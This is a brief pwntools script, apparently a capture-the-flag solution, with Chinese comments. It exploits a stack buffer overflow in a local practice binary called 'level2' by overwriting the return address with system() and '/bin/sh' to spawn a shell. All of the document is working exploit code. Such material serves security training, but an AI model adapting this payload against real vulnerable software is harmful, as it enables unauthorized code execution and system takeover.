from pwn import *
context.log_level = 'debug'

elf = ELF('./level2')
sys_addr = elf.symbols['system']#system函数地址
sh_addr = next(elf.search(b'/bin/sh'))#/bin/sh字符串地址

payload = b'a' * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)#0xdeadbeef为system("/bin/sh")执行后的返回地址，可以随便指定
io = process('./level2')
io.sendlineafter(b"Input:\n", payload)

io.interactive()
